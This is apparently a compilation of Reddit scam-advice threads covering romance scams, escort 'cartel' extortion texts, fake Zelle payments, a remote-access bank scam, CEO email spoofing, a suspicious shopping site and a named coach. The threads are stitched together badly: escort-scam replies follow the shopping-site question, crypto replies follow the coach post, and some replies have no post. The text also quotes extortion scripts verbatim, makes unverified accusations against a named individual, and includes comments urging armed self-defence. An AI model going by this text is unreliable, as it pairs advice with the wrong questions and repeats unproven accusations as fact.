Romance scammers pretend to be in love with their victims in order to ask them for money. They sometimes spend months grooming their victims, often pretending to be [members of military](https://www.cid.army.mil/romancescam.html), [oil workers or doctors](https://www.consumer.ftc.gov/articles/what-you-need-know-about-romance-scams). They tend to be extremely good at taking money from their victims again and again, leading many to [financial ruin](https://globalnews.ca/news/5095659/romance-scam-money/). Romance scam victims are emotionally invested in their relationship with the scammer, and will often ignore evidence they are being scammed.

If you know someone who is involved in a romance scam, beware that convincing a romance scam victim they are scammed is extremely difficult. We suggest that you sit down together to watch Dr. Phil's shows on romance scammers or episodes of Catfish - sometimes victims find it easier to accept information from TV shows than from their family. A good introduction to the topic is this video: https://youtu.be/PNWM5nuOExI -

- I do have the photo. It was sent to me. I tried to reverse image search but it‚Äôs linked to too many sites I don‚Äôt want to click on. I was hopeful I could find it linked to news articles but no luck. Could I send it to you? Not sure the rules/linking it here
- Good point.
- People have posted pictures of catfish scammers before ([an example I could find](https://www.reddit.com/r/Scams/s/nenn8WRpx7)). As long as there isn't any identifying information or nudity, I don't think it breaks the rules.

But just to be safe, u/rscams_mods ?

So as I mentioned I reversed searched this photo and it comes up with sites that I didn‚Äôt want to click on, some associated with porn sites. It sometimes listed the recurring name I mentioned in the post but I‚Äôm not sure if it is this person. It did not show any news articles for scams around this picture. I trying to see if he‚Äôs received any other photos from this scammer I can use to search further.
- I couldn't find any original source, I think it might be from some OnlyFans account hence the porn links. The girl's name is Coco Koma.
- Thanks for doing some digging. Such a weird situation.

Title: Day after Escort scam
Body: Throwaway account. I‚Äôm a male client who used Tryst to try to find an escort. I sent a lot of messages to different girls trying to find the right one that would accommodate. Sometimes it just didn‚Äôt work and I was polite about it. One girl did end up making the commute to my hotel after I gave her a $100 deposit. However, I stood her up because I got cold feet. I feel bad but that‚Äôs what the deposit is for. Sorry girls! 

Flash forward to today and I received the following threatening message: 
‚ÄúI am a representative of several girls that you have contacted, I inform you that you have serious problems with my company that you must solve for your own good. I have several reports with your number that you have wasted the time of the girls in my company so now the boss is upset about this situation and asks you to pay for the lost time of the girls to avoid bloodshed in your house, so what is your decision to pay the fine or not?‚Äù

In the message they also listed family members and my address. What should I do?  I am leaning towards just blocking and not responding, but is this kind of extortion common?  

Thanks for your advice.

- Scam. Block them, don't pay them. It's  a new scam for you, but it's a common scam, reported here every day. It's scary, but it's all lies. If the cartel was killing people it would be big news on CNN. If they killed everyone they threatened, bodies would be stacked up in your neighborhood. 

Looking for an escort is not shameful. The problem is that most of those sites are scams, they take a little bit of info that you give them and threaten you to try to make money. They want your money, nothing else. If you don't pay, they will eventually stop bothering you. 

How do they get addresses and relatives names? The same way anyone can online. If you do a Google search with your name or phone number, it will return multiple sites like Spokeo and Radaris that have your address, former addresses, relatives, people who live with you. All publicly available information. 

The cartel is not going to bother you or your family. They make millions of dollars running drugs and other crimes. The cartel isn't messaging you; the escort extortion is actually run by scammers on another continent, probably in Africa or southeast Asia. When they contact Europeans, they pretend to be Albanian mafia.
- That is why if you are doing stuff like that you should never use your actual number. 

But just ignore it. They are regular scammers trying to scare you into giving them more money. That message doesnt even seem very threatening lmao.
- Scam. They got those infos from public databases like social media, for example. They then used those infos to scare you.

The threats are empty and fake. The best move is to block those scammers. Never reply to them

- Post #376 this week of horny dudes trying to hookup with random women online.

Trying to find escorts online is as dumb as looking up "Live RPG-7 For Sale" on google.

All of those "escorts" websites are all scams along with the magic mushroom, weed, xanax sale sites.

You dont buy that stuff online unless you want to be scammed.  Those are in person transactions. 

Life tip. ZERO girls will ever ask you for a picture of your willy. Your girlfriend/wife wont ask you to send them a pic of your dingaling. If someone asks you for a picture of your fire hose, they're a scammer.
- This scam is done everyday. Just ignore and move on.
- Ignore it

And stop looking for hookers
- !cartel scam. you're good.
- The scammer is sitting somewhere an ocean or two away, and used publicly available information to find your address.  Just ignore it.
- And never consider sending money to keep something like this quiet.  
There is NO AMOUNT of money that will ever stop the increasing demands for more.

Listen to me very clearly that we are making this peaceful warning so that you can solve this problem and avoid bloodshed, we already have your relativeslocated and we have not paid you a visit at this time because we want to see how you solve this problem so that you can continue with your life in peace will be waiting for your answer because I have to give a positive answer to my boss or else you will have to face the consequences.

- Yes, it always says the same thing. Search this sub, there are several of these reported each week.

The scammers are likely in Nigeria, or Myanmar, they send these on a massive scale, hoping that at least a small proportion of the victims will pay up. Block and ignore them.
- Yes. These scams seem to target united states people the most. I am aware other countries allow it.

- No need. If it's not in your Zelle app or bank account, it's not there.

!fakepayment
- Never trust a screenshot as proof of anything. They don't mean shit. 

Instant money transfers are such that they just go to your bank. If your bank says it's not there, it's not there.
- It doesn't matter what a real screenshot looks like because a real screenshot is easily faked and doesn't prove anything.

Zelle is an online payment system. The "proof" is when you receive money in your account. (This should be "within minutes" if you're already enrolled in Zelle.)

Anyone sending you screenshots to prove they paid you is almost certainly lying. Normal people don't send those.
- The screenshot of the email might help (if you post it don't forget to hide your information)
- Scammers love asking for screenshots and sending fake screenshots. If someone you've only met online is discussing financial things with you and getting into "screenshot" talk with you, they're a scammer
- Hi /u/seedless0, AutoModerator has been summoned to explain the Fake payment scam.

The fake payment scam occurs when someone tries to trick you into thinking that you have received a legitimate payment when no such payment has been made. The most common method they use is sending you an email meant to look like a payment confirmation. In some cases the emails will be almost indistinguishable to a legitimate email sent by the payment service. Scammers are known to also show you screenshots instead of an email. Never trust a screenshot a stranger shows you, because it is probably doctored.

Scammers [spoof](https://en.wikipedia.org/wiki/Email_spoofing) the 'from' email to match an official address, and make you think you received a legitimate email. To combat a fake payment scam, verify online payments by logging in directly to the service. Do not check your junk folder, and do not assume a payment is legitimate based on an email alone. If a payment isn't reflected on your account and the person you are dealing with insists they have sent it, call support and ask about it. [Here](https://i.imgur.com/X9xn8uw.jpg) is an image of a scammer trying to pull off a fake payment scam. There is also a variant of the fake payment scam where you will receive a legitimate but fraudulent payment.

A variant of the fake payment email is just an advance fee scam: the scammer tries to convince you that your funds are on hold, and that you have to upgrade your account by sending the scammer some money to authorize the payment. No payment processor works like this. If you think you're dealing with a scammer, you're probably right. Always trust your gut.

- Yeah I figured. I saw someone post on Reddit that very rarely transactions do take a couple days to show up. I am being hopeful that it is that situation otherwise I would have to take the to court.
- Yeah I assumed that was the case

The logo it weird and the alignment seems off. My assumption is that this is fake
- I‚Äôve met them in person and I have a contract with them that they are not holding their end up on. If it comes to it I will take them to court
- Zelle is for friends and family.
It even says so on their website.


Do not use Zelle for internet randos.
- " Zelle¬Æ is a fast, safe and easy way to send and receive money with friends, family and others you trust -"
- Yeah, I was sure it was a scam before, but I can't imagine a massive bank like WF letting an e-mail go out with that super wonky looking logo.
- Why would you do this? Not accepting their scam costs you nothing. Taking them to court costs you filing fees at the minimum.
- I don‚Äôt have Wells Fargo so playing devils advocate maybe there is personal information in that part that is cropped out but really it looks like a poorly thrown together fake email

Title: Bank Scam with access to PC - any further steps to take after the breach?
Body: My Dad (80+) fell victim to the classic scam where the fraudulent caller poses as representative of the bank and gained access to the PC. They attempted to drain the accounts immediately. Luckily it was caught early before the transfers were confirmed so he should be ok financially.

¬†My question is related to any further attacks using information they have gathered while having access to the PC. Obviously I have changed passwords¬†to all applications and I have destroyed the drive and will setup him with a new install.

But there there is anything else to consider to prevent any further breaches? E.g. would it be worth changing his email address?

- He'll get more emails and calls, so be extra vigalent.

Destroying the drive is a bit extreme.  A fresh install should be sufficient.

Enable two factor authentication everywhere it's supported.  Strong and unique passwords.
- consider software like SeraphSecure. It will identify and disable remote access programs. I believe you can also have it contact YOU when someone tries to access your dad's PC. Good luck, glad they didn't get any money.
- Make sure after resetting password to secure it with MFA preferrably using MS or Google Authenticator and others.
- >E.g. would it be worth changing his email address?

Possibly? Pull his profile on haveibeenpwned.com and see how bad it is.
- [deleted]
- If your father did his banking on his pc, get that stopped immediately. I know alot of banks are a bit more pushy these days with apps and sites, but in all honesty, either you or him should go to the bank directly for any money transfers. 

If he has any memory troubles due to age, put up notes in places that make sense. IE, big note next to pc monitor that says 'if they ask for permission to screen share or do team viewer they are a scammer.'

Things along those lines but make sense for him so that he knows it isn't something he should be doing.

Make sure that no programs were recently installed like team viewer etc on the pc when you do a fresh one. 

Also, definitely check to see if there are any ways to block spam texts on his phone and email, if its known that it is a cell phone, texts can get him too.
- A very similiar thing happened in my family recently. 

We reset all the passwords and got new credit cards and bank account numbers. Then we wiped the computer and partioned the hard drive to set up a user profile for the person to use day to day, and an administrator profile that has sole ability to allow changes to the PC. Plus antivirus software and a serious chat about how no legit person ever needs remote access.
- This is why I keep repeating that online banking is NOT inherently secure for people with declining cognitive ability, people anxious and uncomfortable with technology, etc.

My mom does all banking by telephone and in person, and I am adamant that she NOT sign up for online banking, even though the bank keeps trying to push it.
- Thanks - I assume he's on a list somewhere so will be getting more calls.
- Awesome - wasn't aware of that product, sounds ideal for this situation. Thank you.
- Good point - yes it is on the site but from a breach a few years ago. I'll keep monitoring. Thanks!
- actually goes back further than that, see "The Bank Examiner Scam." They used to do it in person, outside your bank.

Title: Yo I need help. Being threatened for messaging a companion.
Body: So last night I was coming home from vacation and I was a little drunk and messaged some girls off a companion site. 

I am stupid and went on a companion site last night and now I‚Äôm being threatened with violence. I wouldn‚Äôt be so scared if the guy didn‚Äôt send me my address.

I am at a loss of what to do. He is asking for 3k and I am not sure if I can go to the police over something like this.

What would you guys do in this situation? 

Do I ignore them because it‚Äôs a scam?

Do I go to a defense lawyer and see what my options are to get the police involved?

I am so scared rn and I really could use some peace of mind if anyone can assist with this

- !cartel scam. Block and ignore.
- 6th one here today.  No offense
- !escort or !cartel scam. 

Block the number, ignore & move on with life.
- They put up fake ads to get your # so they can try to scam you. They don't know who you are, they're not gangsters or cartel members, they just have your #. They're  random scammers in some other country. Just block them, they won't do anything.
- Chill bro just a scam. They stop if you ignore
- If you pay, they will continue shaking you down till you figure out it‚Äôs a scam or run out of money.
- I know you‚Äôre rattled but just take a breath. You are safe and nothing will happen behind this scam. Finding info via phone is easier than you think

My cousin received one of these messages. Little did they realize my cousin is a true menace to society. He proceeds to play along and say one of his puta‚Äôs tried to burn him and he dont pay for strange. Lol Then leaves a Facetime message with all his goon friends ‚Äúcome get your money, we outside and ready to bang‚Äù! They ended up blocking my cousin. This was yrs ago and we have a great laugh to this day about it. 
The point is none of these scammers have face to face balls. Some incel scammer who is broke in a 3rd world country is threatening you. A complete NOBODY
- Just block and ignore.
- ignore/block
- Scam
- Of course go to the cops,then arm your house,bear spray works great I wouldn't give it a second though just don't answer your door to strangers to be safe plenty of scammers out there,I've been hit with plenty over the course of a few years I tell them to f off and hang up ,come to my door and find out what I have for you idiots get a job!!
- Scam. Block them, don't pay them. It's  a new scam for you, but it's a common scam, reported here every day. It's scary, but it's all lies. If the cartel was killing people it would be big news on CNN. If they killed everyone they threatened, bodies would be stacked up in your neighborhood. 

Looking for an escort is not shameful. The problem is that most of those sites are scams, they take a little bit of info that you give them and threaten you to try to make money. They want your money, nothing else. If you don't pay, they will eventually stop bothering you. 

How do they get addresses and relatives names? The same way anyone can online. If you do a Google search with your name or phone number, it will return multiple sites like Spokeo and Radaris that have your address, former addresses, relatives, people who live with you. All publicly available information. 

The cartel is not going to bother you or your family. They make millions of dollars running drugs and other crimes. The cartel isn't messaging you; the escort extortion is actually run by scammers on another continent, probably in Africa or southeast Asia. When they contact Europeans, they pretend to be Albanian mafia.

It's a very common scam, and the scammers are not affiliated with cartels or crime groups, they are simply normal scammers using a threatening script. The threats are not real, and there is no risk to your safety whatsoever. The best way to react is to simply ignore the scammer and ignore any of their other contact attempts.

- lol your Cuzzo sounds like a beast. I‚Äôm starting to feel the same that I may just troll them away.

I keep that thang on me too so if this turns out to be the only real threat on here then I‚Äôm gonna go out with a bang
- Thank you for this. I just sat down and thought about why this scam was so effective as opposed to other ones. I think the reason is that the victim immediately thinks about the fact that they can‚Äôt go to the police for fear of arrest. It‚Äôs kinda clever when you really think about it
- He is really a nice guy. He was just infuriated at being threatened and went HAM
- Yes, similar to loan sharks and other predatory types-- victim feels like they can't contact police. Also the shame that many victims feel.

But in the US, and many other countries, if someone is actually threatening you, you can go to the police. Whatever you did, threats of violence are a valid reason to contact police. You could talk to your local police about this threat, but I think they will give you the same advice you've gotten on Reddit.

Also, I don't think most police departments in the US prosecute people for soliciting (I am not a lawyer or law enforcement). Police arrest prostitutes and pimps, but rarely arrest those looking for services.

Title: Gym Bro Trainer pivots in Mindset Coach and Premium Business Mentor
Body: Chent Thambiah is a public figure and self proclaimed "premium business coach / mentor and multiple business owner" who claims to "launch businesses, accelerate companies and mentor entrepreneurs at all stages"

I was duped into using his services and I wanted to share my experience with others so they can make informed decisions about using his services.

His history:

* Reportedly had a troubled youth / fell into bad company
* Dropped out of academic studies 
* Worked for a period in construction / site surveying (with no formal qualifications)
* Quit his job because he didn't want a 9-5
* Became a gym trainer - and claims to have been one of NZ's most successful personal trainers
* Started up a failed gym apparel business
* Cp-founded a startup to gamify training via VR (ARX Augmented Reality Training)
   * An investor invested an unknown sum which "valuated the business at NZ $1m" - this was obviously at a time when investors were throwing relatively small sums at almost any 'VR' startup in the hope that one of them might pay off
   * Was reportedly flown to Paris to attend a conference to attract further investment which never materialised
   * The startup was closed down pre-revenue without an exit and any investment made was lost
   * This story has been spun by Chent as the kernel of his 'rags to riches' success story - he often quotes and has slick videos referencing that "at the age of 21 I built my first million dollar startup". Ive lost count of the number of times Ive seen in his posts etc that he "built a million dollar valuated business")
* Chent then pivoted to online fitness coaching which then somehow morphed into online business coaching / mentoring (without any training) - a common story i.e. gym trainer bro pivots to "business coaching" without any formal business education or even proper business experience (beyond being a physical trainer)
* Now bills himself as a "premium business coach and mentor" and (blurb from his¬†[Presencedapp.io](http://presencedapp.io/)¬†website, Chent: "10+ years as a private coach to CEO‚Äôs, entrepreneurs, and high performers ranging from 6 to 10+ figures. Has a wealth of experience in implementing disruptive tech"
* What he means by this is he was a gym trainer and then pivoted to advising his personal training clients on 'business' (meaning they become gym trainers themselves and must keep paying him coaching money, they in turn find clients to do the same to - and so the pyramid scheme continues). Having had experience directly with him now I would be willing to be that no legitimate CEO of any actual business has ever paid him money to 'advise' or 'coach' them. The ten figure claim is utterly ridiculous (ten figures means in the billions of $).
* Claims to have a successful track record of "launching disruptive tech" despite never having ever launched any successful tech whatsoever 
* He now has a small group of gym trainers, ex gym trainers and sole business operators (i.e. 1 person companies) that he has duped into paying him to be a business coach. His primary advice is to basically bulk pre-sell e.g. training packages etc (which is the origin of the much repeated claim from one of his clients Darren that he 'made' $40k in a week (meaning he pre-sold hundreds of hours of personal training and then had to 'earn' that back over months)
* Chent operates a classic pyramid scheme type model - he strongly encourages clients to stay within him ('friending' them in many cases so they find it hard to leave him) paying him a monthly sum for ongoing business advice. Most of his purported 'clients' (and the same ones he consistently quotes and references on his various pages/sites) are actually his business partners in the¬†[Presencedapp.io](http://presencedapp.io/)¬†platform.
* The¬†[Presencedapp.io](http://presencedapp.io/)¬†platform has been supposedly launching for several years now and has pivoted many times (from XLR8 online, to Xperience, and now Presence). Checkout the website for an 'explanation' of the many pivots. A year ago it was billing itself as a "decentralized social media platform" without any actual explanation for how that decentralization would actually work. Blockchain, native tokens, users paid for their "attention" etc etc. I would be very surprised if this platform ever actually launches properly and gets anywhere. Chent recently claimed that Presence is currently "valuated (sic) at multiple seven figures" which is total BS given they have a grand total of zero dollars in revenue.
* The constant re-branding and pivoting of the same idea / platform is a way to distance himself from the repeatedly failed promises of launch dates 
* Despite actually never having launched a single successful business (beyond being a gym personal trainer and then pivoting that to being a "business coach and mentor" with the same personal training clients) he claims to be a multiple business owner - but as far as I can tell his businesses have failed or were shut down ('Above Average' gym apparel brand, ARX Augmented Reality training, XLR8, Xperience etc).

Chent uses classic pyramid scheme techniques: e.g. makes a big deal of how even he (as a master coach) still "invests in himself" i.e. pays for coaching - though he does this without disclosing who the coach (he often obscures their face) - however I know for a fact that the coach he claims to use (by simply chatting to as opposed to paying) is actually his business partner in the yet to materialise 'Presence' platform (Kal, the Advisory CFO of 'Presence'):

Kal (the Advisory CFO) in videos (available on Chent's Instagram profile at the time of writing - which Im sure he will take down after getting called out) claims to have "exited a company to Uber for $3.1B" (the company is 'Careem') which is often referenced as the basis of his relevant experience and Im quite sure is also the basis of Chent's claim to work with "10 figures" 'clients'. In reality Kal worked for Careem a grand total of 11 months (from Kal's LinkedIn profile: "CFO Careem Oct 2014 - Aug 2015 ¬∑ 11 mos") a full 4 years before they were brought by Uber in 2019. Classic Chent-ism here (stretching a distant kernel of truth) - Kal worked for a company for 11 months which was then several years later brought out by another company and he/Chent then spin this as that he "exited a company for $3.1bn" as if he was the founder or even owner. This claim is often quoted to potential investors to enhance the perceived credibility of the Presence venture.

Chent has made multiple posts pushing the narrative that: too many people quit (cancel using him) "just before a big breakthrough" - I guess this is an attempt to create fear of discontinuing using him as a paid coach despite no results. He literally went to Dubai and rented a supercar for a day and now uses video/image of that regularly in his self marketing promotional material.

Note - I anonymously approached Chent to call him out on some of his BS claims and giving him an opportunity to stop using exaggerated and untrue claims. He immediately blocked me and didnt respond. This post is to hopefully help others to make an informed decision before they are parted with their hard earned money.

I would encourage you to search his name in the usual platforms i.e. YouTube, Google, Facebook etc and you'll see various examples supporting everything Ive laid out above.

- Hi /u/belsonc, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- Don't invest in crypto. Problem solved.
- The problem is thinking you can make money at crypto without going back in time to 2009.

- Well it crypto wasn't the problem the company was. But i won't invest anywhere no more lesson learned
- There are big enough swings in value that you can get lucky. Last year I managed to make a few hundred bucks on a Bitcoin ETF (BTCX-B.TO) over a couple of months

All of these schemes to invest in bespoke platforms are, of course, scams
- [removed]
- Crypto is a scam at this point. If you want to invest, talk to real financial advisor and invest in trusted sources, like stocks and money markets.
- Yes. Crypto is the problem.

Anyone who plays around with it at this point is just asking to be scammed.
- I guess you‚Äôll need to relearn this lesson again then.
- You are correct,  but most of the local  OPs can't understand those subtleties. 

I hate volatility so I put my money in broad index funds. Not quite as high returns on average as the S&P, but I don't take the same beatings the S&P does on bad days, either.
- My concern with the "all crypto is a scam" mantra is that people will dismiss it as being just an anti-crypto anything statement 

All crypto is a gamble, all new coin offerings are pump and dumps, and, all social media based investment schemes are scams

But, just speculating on something like BTC isn't an actual scam, it's gambling
- You are correct, but the OPs posting here need to be shaken vigorously by the scruff of the neck to wake them up, so "All crypto" is more useful for dealing with them.

Title: My name is being used to scam people at my company
Body: Hi all,

I searched the sub for more info on what happened and apparently this is a fairly normal scam.



I own a company and roughly 1 year ago a coworker received an email from "me" who of course had my name as the sender but the actual address was a bunch of garbage.  
We are a small business and we all work together from the same room. There is very little hierarchy so the person who received the email immediately notified me about this.  
I then changed all the company's passwords but then, today, a person in my company got actually scammed again by this method.



Luckily he just came to me saying that he had just bought the gift card and couldn't afford to buy the second one ‚Äì BEFORE sending everything to the scammer. We'll be refunding him for the gift card and the amount was trivial but it creeped me out.



I am the person doing all the tech stuff at my company. I am not a professional but i like this world very much. I like to understand it and try to maintain my IT environment myself. Jack of all trades... I know. But the company size can't afford an IT team.



Besides, I am very privacy conscious - I de-googled a lot of time ago, use a proper vpn all the time, throw-away email addersses for public services, 2fA for important ones, bitwarden and single-use passwords fro everything.



So here is me trying to have a better understanding. It is very likely they know I own the company since this is probably very easy to find this information. But the guy is an INTERN who started working with us not more than 2 weeks ago. We exchanged only a few email (he from his personal gmail address, sending emails to my company address) he didn't post anything on linkedin so how the hell could they know he started working for us?



Other than alerting everybody at the company about this, is there a way I can understand where  this is coming from? (i.e. what kind of breach, etc.)



Should I be concerned?

Thank you all for your help.

- Likely your email addresses are being spoofed rather than your systems being compromised. Spoofing is a really really easy thing to do as you've seen. Just make sure everyone's spam/junk filters are enabled and working and it should catch most of it. Educate your co-workers about being careful if phishing emails and the signs to look for.
- >But the guy is an INTERN who started working with us not more than 2 weeks ago.¬†

This is 2025.  Every employee who is onboarded needs to be provided some basic but business focused cybersecurity and scam awareness training on day one.  Management cannot assume that because everybody sits around in one room, that everybody is on board.
- If you are all working together from the same room, I would tell everyone in person that they should double check with you in person/by calling your phone whenever they get an email from you asking them for money, gift cards, hand over passwords, etc

I would also educate them on how to recognize signs of phishing and what a scam attempt looks like. An urgent request ("I need you to buy me this gift card ASAP") is a tell tale sign of a phishing scam.

Also, make sure everyone knows what is your real email. If they receive a request from you that seems odd, they should first very carefully compare it to your real, "known" email address. The differences between your real email address and the fake one will probably very minor, but your employees will be able to spot them if they look carefully enough.
- Call a few MSPs in your area and see what the price is to run an email validation audit on your mail server. Tell them you've had a couple of spoofed emails come through.

Are any accounts compromised? unlikely.

Scammers scan LinkedIn/Facebook for people posting they have a new job. Then they send an email "from the CEO" to the new employee. New employees are at greater risk because they don't want to say no to their new boss and be thought a failure AND they don't know the scammers request is unusual.

I don't know if you have M365/Exchange but Microsoft has a great writeup on preventing spoofed emails.

https://learn.microsoft.com/en-us/defender-office-365/anti-phishing-protection-spoofing-about
- Did the intern receive the scam email at his personal or business email address? 

When he started work, did he post Anywhere, saying what company he'd be working for?  Do you use third-party vendors for payroll, training, supplies, business cards, professional society, etc that might indicate he was new to your company?

It doesn't sound like you necessarily have any kind of systems security issue; more likely just some info leakage which scammers are trying to exploit via social engineering.
- Bigger companies with an IT staff routinely run security audits that send out fake phishing emails to see which employees click on the link. (Spoiler alert: most of the employees do.) You might consider getting a tool or package that allows you to send reminders about internet security to your employees, and run audits. If you can afford it, maybe get a consult from an IT security professional. (But be very careful to hire someone who is not a scammer!)

If your business involves any e-commerce with clients, you may need to upgrade that security as well.

This stuff is a huge timesuck for small businesses. It's probably not going to go away.
- A lot of these guys will go to LinkedIn and other places on the web to gather names and connections to spoof. As someone in AP, it's one if the reasons I do not have a LinkedIn. The general public doesn't need to know who I am when it is only relevant to vendors. 

Believe it or not, one of the most costly "hacks" to ever hit corporate America was actually an AP scam that utilized social engineering. By accessing publicly available information from social media, email lists, and even letterhead templates, the scammers were able to convince several large businesses to change the destination on file for ACH payments to accounts controlled  by scammers. It remained undiscovered for almost 6 months before the vendors began to investigate why they were no longer receiving payments for invoices owed. The scammers were able to get tens of millions of dollars doing this, and they never needed to steal a password or gain control of any proprietary systems. 

The best way to protect yourself from scammers spoofing emails (besides turning on a spam filter) is to have clear procedures in place for payments and proceessing, as well as for updating vendor accounts when sensitive information is changed. No one person should ever be the only set of eyes on a payables transaction. No information should ever be altered based upon an email request or phone call by itself. Employees should only update sensitive info after verifying through a known contact and receiving a secondary set of documents, usually from the vendors bank or via  government forms like a W9. Requests for reimbursement should include an internal form that is filled out, reviewed, and approved by the employee, the manager, and your accounting staff before it is paid.  Make sure permissions to access certain things are only given to people on a need to know basis, regardless of what position they hold at your company. Clearly divide tasks such as procurement, validation, and issuing payment. 

This is especially important if your business utilizes gift cards. Many workplaces and social service agencies utilize gift cards for employee bonuses or client incentives. Any request for such things that include secrecy or urgency should be treated with suspicion.
- We get these emails every once in a while at my job. It's something like some one of the department managers saying "Hey I'm in a meeting right now, but I need you to do me a favor." The only way to fight it is to hold semi-frequent training of how to spot fraudulent emails.
- You might want to get a subscription to Ninjio or something similar for your team. They could use the consistent learning about the latest phishing etc trends and what to look out for.
- Thank you, this is probably the case. But I can't understand... how could the scammer know the relationship between me and this person?  
He just started working for us.
- It is a good idea to set dmark/dkim for extra security, set spf record fo hard fail (this one is tricky as might lose legitimate emails).
- They didn't. They might know you're in the company and just used the only name they had. Usually these things are wild guesses which is why they work so seldom. But the right guesses have a better chance so they try anyway.
- thank you, I'll look into it.
- So you are saying they are randomly sending emails and happened to find somebody from our company (10-15 people in total) not once, but twice?

Isn't this like extremely unlikely?
- Most of the time, they are using things like LinkedIn to find out who works for who. Try searching out the emails they've been using to see if somewhere on the Internet.


They might also just guess the email address of someone who works there if they are just using their name.¬†


Look closely at the emails they've been getting. Make sure that they are not actually sent from your domain. That would mean a business email compromise which is far more severe.
- LinkedIn data is out there. We had a secretary get a "hey this is VP on my personal email" message a week after she started because she updated her page.¬† It's called spear phishing, education and whatever email you're using should have the option to turn on an external alert banner are your best weapons.
- Depends. They send millions of these things at a time, usually to lists of purchased email addresses. If it was registered anywhere that their list of emails might be compromised (say, a newsletter) they could have just gotten it. Or someone they're sending emails to has a compromised PC. All sorts of possibilities. Usually spam filters catch those garbage/fake from addresses though. If they're enabled anyway, that's why I mentioned it.
- We can only guess. I *could* guess, for example, that one of the people working alongside you is in on it. No idea how true that is, but it's not impossible.
- emails were not sent from my domain, first thing I checked (and told the guy to check when he came to me with an apple gift card in his hand)
- I see.   
The way they acted though was as if they knew he was working for me. like "hey I need a favour, please keep this confidential, etc." hence my suspicion.   
Thank you for giving me insight on this though.
- No one is really reading your post closely. It does sound like something is compromised. If your intern didn't post about his job anywhere, not even on LinkedIn, and is using a personal email account, it's very concerning that a scammer could have figured out he just started working for you. Sorry I don't have any advice for you, but you definitely need to keep digging.
- Thank you, this is what concerned me and the situation is exactly like you described. He received in on his Personal email address, he only had correspondence with me and one of my associates (both on business email accounts) with that very address and I have no idea how they could have figured this out without being in my system somehow.
Or at least something related to the mail server? Because if they were/are in my system, why not ransomware?
- If his personal email or computer is compromised, they knew your email, his email and that he was hired.
See if he received the scam email from one of those business addresses that were in his mailbox.

Title: Is quiet.canadastay.shop legit or no?
Body: Ive been looking for Studio Ghibli steelbooks for a while, one of which is Castle in the Sky, which normally goes for around $400. I went searching and found this website selling it for only $110. I dont see any data about a seller in specific, so I dont know who is selling it and where it would be coming from, although I do see an email at the bottom of the website. When I pretend like im checking out, it for some reason.. drops in price from $114 to $99, yet the order summary says $78. 
Never have seen it on reddit posts, theres minimal data found about the site, but when i scam and virus check it, it doesnt find anything. It seems to have been created 5 years ago but im not sure if that means much. I live in the US, and the site is (at least titled) to be in Canada, so maybe that's a factor.

Heres the link: https://quiet.canadastay.shop/

Any info on if this site a scam or legit?

- !whois canadastay.shop

We will see what the bot says, but .shop is 99.9999% scams.
- URL is "quiet.canadastay.shop," top of the website says "Balloon," and the email address is geraldine@germanynow.top

This is an obvious scam site
- Oof. 3 month site, and check out the conflicting information. It's got a Canadian vacation domain name, an alleged south Florida warehouse, and is that supposed to be customer service? No physical address.

It's just another bullshit parade.

- ` WHOIS REPORT FOR CANADASTAY.SHOP `

This domain name was first registered only 3 months ago (Oct 2024) and it was only registered for a single year (Expires: Oct 2025). 

The person/organization who registered this domain claims to be based in Iceland. It is also concerning that they are hiding the rest of their contact info on Whois AND they are using a "DNS proxy" (CloudFlare) which masks where the website's server actually is. Additionally, the ` .shop ` TLD is "low-quality" and more likely to be associated with malicious content.

- !cartel it's a scam. stop messing with prostitutes on the internet.
- This scam is posted here 20 times a day.
- Do they refer to themselves as 'Tony the mafia man' ?
- Escort scam.  There are only scammers.  no escorts.  Just block and ignore.
- Tony is not with the mafia and Tony is not a man
- Post #376 this week of horny dudes trying to hookup with random women online.

Trying to find escorts online is as dumb as looking up "Live RPG-7 For Sale" on google.

All of those "escorts" websites are all scams along with the magic mushroom, weed, xanax sale sites.

You dont buy that stuff online unless you want to be scammed.  Those are in person transactions. 

Life tip. ZERO girls will ever ask you for a picture of your willy. Your girlfriend/wife wont ask you to send them a pic of your dingaling. If someone asks you for a picture of your fire hose, they're a scammer.
- Scam. Block them, don't pay them. It's  a new scam for you, but it's a common scam, reported here every day. It's scary, but it's all lies. If the cartel was killing people it would be big news on CNN. If they killed everyone they threatened, bodies would be stacked up in your neighborhood. 

Looking for an escort is not shameful. The problem is that most of those sites are scams, they take a little bit of info that you give them and threaten you to try to make money. They want your money, nothing else. If you don't pay, they will eventually stop bothering you. 

How do they get addresses and relatives names? The same way anyone can online. If you do a Google search with your name or phone number, it will return multiple sites like Spokeo and Radaris that have your address, former addresses, relatives, people who live with you. All publicly available information. 

The cartel is not going to bother you or your family. They make millions of dollars running drugs and other crimes. The cartel isn't messaging you; the escort extortion is actually run by scammers on another continent, probably in Africa or southeast Asia. When they contact Europeans, they pretend to be Albanian mafia.
- Given how often I see this scam I have to wonder if there's any actual escorts for hire out there, or if they're all tied in with the death threat cartels? Like, given the number of guys who are 'just bored and lonely', I feel like there could be a real business opportunity. Like Uber Eats but I guess you'd call it Uber Girls or something. Pay money to the cyberpimp, they send a girl out in a taxi to wash dishes or clean the house or play D&D or whatever it is bored guys do with these girls.
- Hi /u/erishun, AutoModerator has been summoned to explain the Escort or Cartel death threat scam.

It's a very common scam, and the scammers are not affiliated with cartels or crime groups, they are simply normal scammers using a threatening script. The threats are not real, and there is no risk to your safety whatsoever. The best way to react is to simply ignore the scammer and ignore any of their other contact attempts.

Title: Is myFurtrieve a scam?
